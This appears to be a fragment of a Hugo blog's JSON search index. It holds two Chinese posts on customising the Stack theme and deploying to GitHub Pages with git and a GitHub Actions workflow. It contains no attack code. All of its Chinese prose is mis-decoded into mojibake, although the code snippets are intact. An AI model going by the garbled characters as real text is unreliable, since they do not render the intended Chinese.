themes\\hugo-theme-stack\\assets\\scss\\grid.scss å¤åˆ¶åˆ° /assets/scss/grid.scss themes\\hugo-theme-stack\\layouts\\index.html å¤åˆ¶åˆ° /layouts/index.html åœ¨ static æ–‡ä»¶å¤¹ä¸‹æ–°å»º code-header.svgï¼ˆmacOS é£æ ¼çº¢ç»¿ç¯å›¾æ ‡ï¼‰ themes\\hugo-theme-stack\\assets\\scss\\partials\\layout\\article.scss å¤åˆ¶åˆ° /assets/scss/partials/layout/article.scss â€œæ˜¾ç¤ºè¯­è¨€å’Œå¤åˆ¶æŒ‰é’®â€ä¸ä»£ç è¡Œè‡ªå¸¦çš„copyé‡å äº†ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰å¼„ å¦‚æœä½ æƒ³æ›´ä»å®¹ä¸€ç‚¹ï¼Œå¯ä»¥æå‰æŠŠä¸Šé¢çš„æ–‡ä»¶å¤åˆ¶ä¸»ç›®å½•ã€‚å¼€å§‹é­”æ”¹å‰ï¼Œè®°å¾—æ•´ä½“å¤‡ä»½ä¸€ä¸‹ã€‚\nä¸€äº›ç»†èŠ‚ æ·»åŠ æ–‡ç« å¼€å¤´æ›´æ–°æ—¶é—´å’Œå­—æ•°ç»Ÿè®¡ â€‹\tåœ¨layouts\\partials\\article\\components\\details.htmlæ–‡ä»¶ä¸­ï¼Œçº¢æ¡†æ ‡è®°çš„å°±æ˜¯å¢æ·»ç»„ä»¶çš„ä»£ç ï¼Œé»„æ¡†æ ‡è®°çš„å°±æ˜¯ä¸¤ä¸ªç»„ä»¶çš„iconå‘½åï¼ˆç›®å½•åœ¨/assets/iconsä¸‹ï¼‰\nä¸‹å›¾æ‰€ç¤ºï¼Œå°±æ˜¯å¢æ·»åçš„æ–‡ç« æ ‡é¢˜ç»„ä»¶\næ·»åŠ æ–‡ç« æœ«å°¾æœ€åæ›´æ–°æ—¶é—´ â€‹\tåœ¨åšå®¢ä¸»æ–‡ä»¶å¤¹ä¸‹ layouts\\partials\\article\\components\\footer.htmlæ›´æ–°ä¸‹é¢ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;footer class=\u0026#34;article-footer\u0026#34;\u0026gt; {{ partial \u0026#34;article/components/tags\u0026#34; . }} {{ if and (.Site.Params.article.license.enabled) (not (eq .Params.license false)) }} \u0026lt;section class=\u0026#34;article-copyright\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;copyright\u0026#34; }} \u0026lt;span\u0026gt;{{ default .Site.Params.article.license.default .Params.license | markdownify }}\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; {{ end }} {{- if ne .Lastmod .Date -}} \u0026lt;div\u0026gt; \u0026lt;section class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;edit\u0026#34; }} \u0026lt;time class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ T \u0026#34;article.lastUpdatedOn\u0026#34; }}{{- .Lastmod.Format (or .Site.Params.published \u0026#34;2006-01-02T15:04\u0026#34;) -}} \u0026lt;/time\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/div\u0026gt; {{- end -}} \u0026lt;/footer\u0026gt; é€šè¿‡ä¸Šé¢ä»£ç ç¬¬16è¡Œï¼Œarticle.lastUpdatedOnæ·»åŠ â€œæœ€åæ›´æ–°äºâ€\næ·»åŠ ç½‘ç«™è¿è¡Œæ—¶é—´ç»„ä»¶ â€‹\tæ‰“å¼€layouts\\partials\\footer\\footer.htmlæ–‡ä»¶ï¼Œå°†ä¸‹é¢ä»£ç æ’å…¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;span id=\u0026#34;timeDate\u0026#34;\u0026gt;è½½å…¥å¤©æ•°...\u0026lt;/span\u0026gt;\u0026lt;span id=\u0026#34;times\u0026#34;\u0026gt;è½½å…¥æ—¶åˆ†ç§’...\u0026lt;/span\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; var now = new Date(); function createtime(){ // å½“å‰æ—¶é—´ now.setTime(now.getTime()+250); var grt= new Date(\u0026#34;2024/10/15 00:00:00\u0026#34;); //ç½‘ç«™è¯ç”Ÿæ—¶é—´ days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = \u0026#34;0\u0026#34; + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = \u0026#34;0\u0026#34; + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = \u0026#34;0\u0026#34; + snum;} document.getElementById(\u0026#34;timeDate\u0026#34;).innerHTML = \u0026#34;æœ¬ç«™å·²ç¨³å®šè¿è¡Œ\u0026#34;+dnum+\u0026#34; å¤© \u0026#34;; document.getElementById(\u0026#34;times\u0026#34;).innerHTML = hnum + \u0026#34; å°æ—¶ \u0026#34; + mnum + \u0026#34; åˆ† \u0026#34; + snum + \u0026#34; ç§’\u0026#34; } setInterval(\u0026#34;createtime()\u0026#34;,250); \u0026lt;/script\u0026gt; è¯¥ç»„ä»¶æ•ˆæœå±•ç¤ºï¼š\nå·¦ä¾§æ  ID å’Œç®€ä»‹æ¢è¡Œ â€‹\tæ‰¾åˆ°layouts\\partials\\footer\\footer.htmlä¸­ä¸‹æ–¹ä»£ç ï¼Œæ›´æ”¹ä¸º\nå¯ä»¥æŒ‰ç…§ä¸ªäººéœ€æ±‚å¯¹ä¸‹é¢ä»£ç è¿›è¡Œè°ƒæ•´ï¼Œæˆ‘å°†â€œä¸ªäººIDâ€ç›´æ¥å†™è¿›ä»£ç ï¼Œé€šè¿‡æ›´æ”¹subtitleå®ç°æ¢è¡Œ\n1 2 3 4 \u0026lt;div class=\u0026#34;site-meta\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;site-name\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ .Site.BaseURL | relLangURL }}\u0026#34;\u0026gt;\u0026lt;span\u0026gt;Ranch\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h2 class=\u0026#34;site-description\u0026#34;\u0026gt;{{ .Site.Params.sidebar.subtitle1 }}\u0026lt;br\u0026gt;{{ .Site.Params.sidebar.subtitle2 }}\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; å®é™…æ•ˆæœå±•ç¤º\nåˆ°è¿™é‡Œä½¿ç”¨Hugoâ•Stackâ•Giscuséƒ¨ç½²åˆ°GitHubçš„åšå®¢æ­å»ºå’Œé­”æ”¹ç¾åŒ–å°±å‘Šä¸€æ®µè½å•¦\nåç»­å¦‚æœæœ‰æ›´æ–°ä¹Ÿä¼šç»§ç»­è®°å½•åˆ°Blogè¿™ä¸ªæ ‡ç­¾é‡Œ\né™„å½• å‚è€ƒæ–‡çŒ® ã€ŠHugo-theme-Stack é­”æ”¹ç¾åŒ–ã€‹ ã€Šå¦‚ä½•ä½¿ç”¨git submoduleã€‹ ã€Šå°†åšå®¢è¯„è®ºç³»ç»Ÿç”± utterance è¿ç§»è‡³ giscusã€‹ ã€Šhugo stack ä¸»é¢˜ç¾åŒ–ã€‹ ã€Šå»ºç«™æŠ€æœ¯ | ä½¿ç”¨ Hugo + Stack ç®€å•æ­å»ºä¸€ä¸ªåšå®¢ã€‹ ã€ŠHugoå’ŒGithub Actionæ­£ç¡®ä¿®æ”¹æ–‡ç« çš„æœ€åæ›´æ–°æ—¥æœŸã€‹ ç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-10-20T11:55:35Z","image":"http://ranch007.github.io/p/%E5%8D%9A%E5%AE%A2%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0hugo-stack-giscus%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96-%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1/hugo-stack_hu319509881166415343.png","permalink":"http://ranch007.github.io/p/%E5%8D%9A%E5%AE%A2%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0hugo-stack-giscus%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96-%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1/","title":"ã€åšå®¢è£…ä¿®æ—¥è®°ã€‘Hugoâ• Stack â• Giscusé­”æ”¹ç¾åŒ– ç»†èŠ‚æ»¡æ»¡"},{"content":"ç¯å¢ƒå‡†å¤‡ Gitä¸‹è½½ è¿›å…¥ã€gitå®˜ç½‘ã€‘ï¼Œæ‰¾åˆ°å¯¹åº”é€‚ç”¨äºè‡ªå·±ç”µè„‘ç³»ç»Ÿçš„ç‰ˆæœ¬è¿›è¡Œä¸‹è½½\næ ¹æ®æç¤ºï¼Œé»˜è®¤å®‰è£…å³å¯\nHugoä¸‹è½½ åœ¨ã€Hugoçš„GitHubå®˜ç½‘ã€‘ä¸Šï¼Œæ ¹æ®è‡ªå·±ç³»ç»Ÿï¼Œé€‰æ‹©å¯¹åº”ç‰ˆæœ¬ç›´æ¥ä¸‹è½½ ï¼ˆTipsï¼šè¿™é‡Œæˆ‘æ ¹æ®ã€Hugoå®˜ç½‘ã€‘çš„å»ºè®®æ˜¯å®‰è£…äº†æ‰©å±•ç‰ˆæœ¬ï¼‰ ä¸‹è½½åè§£å‹å³å¯ ï¼ˆå»ºè®®ï¼‰å°†hugo.exeæ‰€åœ¨æ–‡ä»¶å¤¹åŠ å…¥ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼Œæ–¹ä¾¿ä½¿ç”¨hugoå‘½ä»¤ åšå®¢æ­å»º åˆ›å»ºåšå®¢ ï¼ˆ1ï¼‰åœ¨hugo.exeæ‰€åœ¨æ–‡ä»¶å¤¹ä¸Šæ–¹åœ°å€æ ä¸­ï¼Œè¾“å…¥cmdï¼Œç„¶åå›è½¦å”¤èµ·å‘½ä»¤è¡Œ ï¼ˆ2ï¼‰è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œåˆ›å»ºxxxæ–‡ä»¶å¤¹ï¼ˆè¿™ä¸ªæ–‡ä»¶å¤¹å°±æ˜¯åšå®¢çš„ä¸»æ–‡ä»¶å¤¹ï¼Œåé¢ä¹Ÿå¯ä»¥æ”¹åï¼‰ï¼›å¹¶ç»™å‡ºæ­å»ºåšå®¢çš„æ­¥éª¤ 1 2 # åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­ä¸ºåˆ›å»ºxxxåšå®¢é¡¹ç›® hugo new site xxx è¿è¡Œåä¾¿ä¼šè¾“å‡ºä¸€ä¸ªç½‘ç«™ç›®å½•ï¼Œå…¶ç»“æ„ä¸ºï¼ˆå¼•ç”¨è‡ªç‚¸é¸¡äººåšå®¢ï¼‰ï¼š\ncdåˆ‡æ¢è¿›å…¥blog\\ç›®å½•ï¼Œè¾“å…¥ä¸‹é¢å‘½ä»¤ï¼Œå¯åŠ¨hugoæœåŠ¡ 1 hugo server -D Ctrl+é¼ æ ‡å·¦é”®ç‚¹å‡»ä¸Šæ–¹é“¾æ¥ï¼Œè¿›å…¥æ¼”ç¤ºç«™ç‚¹ï¼Œå¦‚éœ€åœæ­¢åœ¨å‘½ä»¤è¡Œè¾“å…¥Ctrl+Cåœæ­¢æœåŠ¡ï¼ˆhugoé»˜è®¤æ˜¯æ²¡æœ‰ä¸»é¢˜çš„ï¼Œåé¢ä¼šè¿›è¡Œä¸€ä¸ªä¸»é¢˜é…ç½®ï¼‰ å¯¼å…¥ä¸»é¢˜ ï¼ˆ1ï¼‰å‰å¾€ã€Hugo Themesã€‘ï¼Œé€‰æ‹©ä¸€ä¸ªè‡ªå·±ä¸­æ„çš„ä¸»é¢˜ ï¼ˆ2ï¼‰å®‰è£…ä¸»é¢˜ä¸€èˆ¬è€Œè¨€å­˜åœ¨ä¸‰ç§æ–¹å¼ï¼š git submodule å®‰è£… æœ¬åœ°å®‰è£… go moduleå®‰è£…ï¼ˆéœ€è¦å®‰è£…Goè¯­è¨€ï¼‰ ï¼ˆ3ï¼‰æˆ‘ä¸ªäººä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œè€ƒè™‘åˆ°åç»­ä¸»é¢˜å‡çº§çš„éš¾æ˜“ï¼Œè¿™ç®—æ˜¯æœ€å‡è¡¡çš„ä¸€ç§æ–¹å¼ã€‚å…·ä½“çš„å®‰è£…æ–¹æ³•å¯ä»¥åœ¨å„ä¸»é¢˜çš„è¯´æ˜ä¸­æ‰¾åˆ°ï¼Œæˆ‘è¿™é‡Œå®‰è£…çš„æ˜¯ã€Stackã€‘ã€‚ åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œè¾“å…¥ï¼š 1 2 3 4 5 # å‰ç›®å½•ä¸­åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„ Git å­˜å‚¨åº“ git init # å°†stackä¸»é¢˜å…‹éš†åˆ°`themes`ç›®å½•ä¸­ï¼Œå¹¶å°†å…¶ä½œä¸ºGitå­æ¨¡å—æ·»åŠ åˆ°å½“å‰é¡¹ç›®ä¸­ git submodule add https://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack ç­‰å¾…ä¸‹è½½å®Œæˆåï¼Œä¾¿å¯ä»¥è¿›è¡Œåé¢çš„é…ç½®äº†ã€‚å‡å¦‚ä½ æƒ³ç”¨å…¶ä»–æ–¹å¼å®‰è£…ï¼Œä¹Ÿå¯ä»¥å‚è€ƒè¿™é‡Œã€‚Stackæœ¬èº«æœ‰å…¨è‹±æ–‡çš„è¯´æ˜æ–‡æ¡£ï¼Œ\nï¼ˆ4ï¼‰ç­‰å¾…ä¸‹è½½å®Œæˆã€‚å»ºè®®å°†exampleSiteæ ·ä¾‹æ•°æ®ä¸­çš„`Contentå’Œhugo.yamlå¤åˆ¶åˆ°ä¸»æ–‡ä»¶å¤¹ä¸­ ï¼ˆ4ï¼‰è¿›å…¥ä¸»æ–‡ä»¶ä¸‹çš„content\\postï¼Œå¹¶åˆ æ‰rich-contentæ–‡ä»¶å¤¹ï¼ˆä¸ç„¶ä¼šæŠ¥é”™ï¼‰ ï¼ˆ5ï¼‰å†æ¬¡å¯åŠ¨hugoæœåŠ¡ï¼ŒæŸ¥çœ‹ä¸»é¢˜ã€‚å…·ä½“ä¸»é¢˜é…ç½®ç»†èŠ‚æ”¾åœ¨ä¸‹ä¸€ç¯‡ã€‚ GitHubéƒ¨ç½² å¸¸è§„éƒ¨ç½² ï¼ˆ1ï¼‰å‰å¾€ã€GitHubå®˜ç½‘ã€‘ï¼Œç™»å½•æˆ–è€…æ³¨å†Œä¸€ä¸ªGitHubè´¦å·ï¼Œåˆ›å»ºæ–°çš„ä»“åº“{GitHubç”¨æˆ·å}.github.ioï¼ˆè¿™é‡Œæˆ‘å·²ç»æ³¨å†Œäº†ï¼‰ ï¼ˆ2ï¼‰å‰å¾€è¿›å…¥xxx.github.ioä»“åº“ï¼Œä»Setting -\u0026gt; Pageså…ˆå°†sourceçš„â€œä»åˆ†æ”¯éƒ¨ç½²â€œåˆ‡æ¢åˆ°â€GitHubæ“ä½œâ€œï¼Œåˆå§‹åŒ–ä¸€ä¸‹ï¼Œå†åˆ‡å›â€œåˆ†æ”¯éƒ¨ç½²â€ ç„¶åBranchå‡ºç°â€mainåˆ†æ”¯â€œï¼Œé€‰æ‹©mainä¿å­˜ã€‚\nï¼ˆTipsï¼šç°åœ¨éœ€è¦å…ˆå°†å†…å®¹æ¨é€åˆ°GitHubæ‰èƒ½å¼€å¯GitHub Pagesç½‘å€ã€‚ï¼‰\nï¼ˆ3ï¼‰å›åˆ°æœ¬åœ°åšå®¢çš„ä¸»æ–‡ä»¶å¤¹ã€‚å‡†å¤‡å‘å¸ƒç½‘ç«™ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒHugo ä¼šåœ¨publicåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­åˆ›å»ºæ•´ä¸ªé™æ€ç½‘ç«™ 1 hugo -D ï¼ˆ4ï¼‰æ¥ç€åœ¨è¿›å…¥ public æ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¸Šä¼ åˆ°githubä»“åº“ä¸Šï¼Œç¬¬ä¸€æ¬¡ä¸Šä¼ å¯èƒ½éœ€è¦è¾“å…¥è´¦å·å¯†ç  1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/{ä½ çš„GitHubç”¨æˆ·å}/{ç”¨æˆ·å.github.io} git push -u origin main ï¼ˆ5ï¼‰å‰å¾€https://github.com/{GitHubç”¨æˆ·å}/{ç”¨æˆ·å}.github.ioï¼Œç‚¹å‡»Branchåˆ¤æ–­æœ‰æ²¡æœ‰ä¸Šä¼ æˆåŠŸ è‡ªåŠ¨åŒ–éƒ¨ç½² å…·ä½“è¦æ±‚ å¦‚æœæƒ³ä½¿ç”¨ Github Actions è‡ªåŠ¨éƒ¨ç½² hugo åšå®¢ï¼Œåˆ™æœ€èµ·ç éœ€è¦åˆ›å»ºä¸¤ä¸ª Github çš„ä»“åº“ã€‚\nç¬¬â‘ ä¸ªï¼Œä¾¿æ˜¯å­˜å‚¨åšå®¢ .md æºæ–‡ä»¶çš„åœ°æ–¹ï¼Œå…¶å®å°±æ˜¯ hugoçš„ä¸»æ–‡ä»¶ï¼› ç¬¬â‘¡ä¸ªï¼Œåˆ™æ˜¯éƒ¨ç½² Github Pages çš„ä»“åº“ï¼ˆå­˜æ”¾publicæ–‡ä»¶å¤¹é‡Œçš„æ‰€æœ‰æ–‡ä»¶ï¼‰ï¼Œä»“åº“åå¿…é¡»æ˜¯ \u0026lt;GitHubç”¨æˆ·å\u0026gt;.github.ioï¼Œè¿™æ˜¯ github å®˜æ–¹è¦æ±‚çš„ã€‚ åŸç†æµç¨‹ 1.å½“æˆ‘ä»¬æäº¤åšå®¢ .md æºæ–‡ä»¶åˆ°ä»“åº“ â‘  åï¼Œåˆ©ç”¨ Github Actions è‡ªåŠ¨æ‰§è¡Œ hugo çš„å‘½ä»¤ 2.åœ¨ public ç›®å½•ä¸‹ä¼šè‡ªåŠ¨ç”Ÿæˆé™æ€ç½‘ç«™ï¼Œç„¶åå†å°† public ç›®å½•æ¨é€åˆ°ä»“åº“ â‘¡ 3.ç”±äºä»“åº“â‘¡ æ˜¯ Github Pagesï¼Œå®ƒæ¥ç€å°±ä¼šè‡ªåŠ¨æ‰§è¡Œéƒ¨ç½²çš„å‘½ä»¤ã€‚\nï¼ˆ1ï¼‰æˆ‘ä»¬éœ€è¦ä»ä¸»æ–‡ä»¶çš„ä»“åº“â‘ æ¨é€åˆ°å¤–éƒ¨ GitHub Pages ä»“åº“â‘¡ï¼Œéœ€è¦ç‰¹å®šæƒé™ï¼Œæ‰€ä»¥è¿˜å¾—åœ¨ GitHub è´¦æˆ· Setting - Developer settings - Personal access tokens ï¼ˆhttps://github.com/settings/tokensï¼‰ä¸‹åˆ›å»ºä¸€ä¸ª Tokenï¼š è¿›å…¥è®¾ç½®ï¼ŒDeveloper settingså°±åœ¨è®¾ç½®å·¦ä¸‹è§’ï¼Œå¦‚ä¸‹å›¾ç‚¹è¿›å»ï¼ˆéœ€è¦éªŒè¯ï¼‰\nå¦‚ä¸‹å›¾è¿›è¡Œé…ç½®ï¼Œåˆ›å»ºä¸€ä¸ªæ°¸ä¹…æ€§tokenï¼Œå¹¶å¤åˆ¶ ï¼ˆTipsï¼šåˆ‡è®°ï¼ï¼Tokenåªä¼šå‡ºç°ä¸€æ¬¡ï¼Œè¯·åšå¥½ç•™å­˜ã€ä¿å¯†ï¼‰\næœ€åï¼Œæ¥åˆ°ä»¥github.ioç»“å°¾çš„ä»“åº“â‘ ã€‚æ·»åŠ ä¸€ä¸ª secretï¼Œä¿å­˜å¹¶å‘½åä½ å¤åˆ¶çš„tokenå€¼ï¼Œè¿™ä¸ªNameä¸‹ä¸€æ­¥éœ€è¦ç”¨åˆ°ã€‚\nï¼ˆ2ï¼‰ç®¡ç†åšå®¢ä¸»æ–‡ä»¶çš„ä»“åº“â‘ ï¼Œç‚¹å‡» Actions æŒ‰é’®ï¼Œå³å¯æ·»åŠ å·¥ä½œæµæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸€èˆ¬æ˜¯ä»¥ .yml ç»“å°¾ï¼Œè¿™æ ·æ‰èƒ½è¢« GitHub è¯†åˆ« æˆ‘åˆ›å»ºçš„æ–‡ä»¶åä¸ºdeploy.ymlï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 name: deploy # ä»£ç æäº¤åˆ°mainåˆ†æ”¯æ—¶è§¦å‘github action on: push: branches: - main\t# è¿™é‡Œçš„æ„æ€æ˜¯å½“ masteråˆ†æ”¯å‘ç”Ÿpushçš„æ—¶å€™ï¼Œè¿è¡Œä¸‹é¢çš„jobs jobs: deploy:\t# ä»»åŠ¡åè‡ªå– runs-on: ubuntu-latest\t# åœ¨ä»€ä¹ˆç¯å¢ƒè¿è¡Œä»»åŠ¡ steps: - name: Checkout uses: actions/checkout@v4\t# å¼•ç”¨actions/checkoutè¿™ä¸ªactionï¼Œä¸æ‰€åœ¨çš„githubä»“åº“åŒå with: submodules: true\t# Fetch Hugo themes (true OR recursive) è·å–submoduleä¸»é¢˜ fetch-depth: 0\t# Fetch all history for .GitInfo and .Lastmod - name: Disable quotePath run: git config --global core.quotePath false - name: Setup Hugo\t# æ­¥éª¤åè‡ªå– uses: peaceiris/actions-hugo@v3\t# hugoå®˜æ–¹æä¾›çš„actionï¼Œç”¨äºåœ¨ä»»åŠ¡ç¯å¢ƒä¸­è·å–hugo with: hugo-version: \u0026#34;latest\u0026#34;\t# è·å–æœ€æ–°ç‰ˆæœ¬çš„hugo extended: true - name: Build Web run: hugo -D\t# ä½¿ç”¨hugoæ„å»ºé™æ€ç½‘é¡µ - name: Deploy Web uses: peaceiris/actions-gh-pages@v4\t# ä¸€ä¸ªè‡ªåŠ¨å‘å¸ƒgithub pagesçš„action with: personal_token: ${{ secrets.{ä¿å­˜toeknçš„Name} }}\t# å‘å¸ƒåˆ°å…¶ä»–repoéœ€è¦æä¾›ä¸Šé¢ç”Ÿæˆçš„personal access token external_repository: {GitHubç”¨æˆ·å}/{ç”¨æˆ·å}.github.io\t# å‘å¸ƒåˆ°å“ªä¸ªrepo publish_branch: main\t# å‘å¸ƒåˆ°å“ªä¸ªbranch publish_dir: public\t# æ³¨æ„è¿™é‡ŒæŒ‡çš„æ˜¯è¦å‘å¸ƒå“ªä¸ªæ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œè€Œä¸æ˜¯æŒ‡å‘å¸ƒåˆ°ç›®çš„ä»“åº“çš„ä»€ä¹ˆä½ç½®ï¼Œå› ä¸ºhugoé»˜è®¤ç”Ÿæˆé™æ€ç½‘é¡µåˆ°publicæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥è¿™é‡Œå‘å¸ƒpublicæ–‡ä»¶å¤¹é‡Œçš„å†…å®¹ commit_message: auto deploy è¿™æ ·ï¼Œæˆ‘ä»¬çš„åšå®¢ç½‘ç«™å°±éƒ¨ç½²å¥½äº†ï¼Œè¿™æå¤§åœ°ç®€åŒ–äº†æˆ‘ä»¬å‘å¸ƒæ–‡ç« çš„æµç¨‹ã€‚\né™„å½• å‚è€ƒæ–‡çŒ® ã€Hugoã€‘Hugo + Github å…è´¹éƒ¨ç½²è‡ªå·±çš„åšå®¢ (letere-gzj.github.io) ä½¿ç”¨ Hugo å¯¹åšå®¢çš„é‡å»ºä¸ Stack ä¸»é¢˜ä¼˜åŒ–è®°å½• ä½¿ç”¨ Github Actions è‡ªåŠ¨éƒ¨ç½² hugo åšå®¢ Github Actions è‡ªåŠ¨éƒ¨ç½² Hugo ç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-10-18T22:19:18Z","image":"http://ranch007.github.io/p/free%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/post/2024-10-18/%E3%80%90free%E3%80%91%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/hugo-stack_hu319509881166415343.png","permalink":"http://ranch007.github.io/p/free%E4%BD%BF%E7%94%A8hugo%E6%90%AD%E5%BB%BAgithub%E7%A7%81%E4%BA%BA%E5%8D%9A%E5%AE%A2/","title":"ã€Freeã€‘ä½¿ç”¨Hugoæ­å»ºGitHubç§äººåšå®¢"}]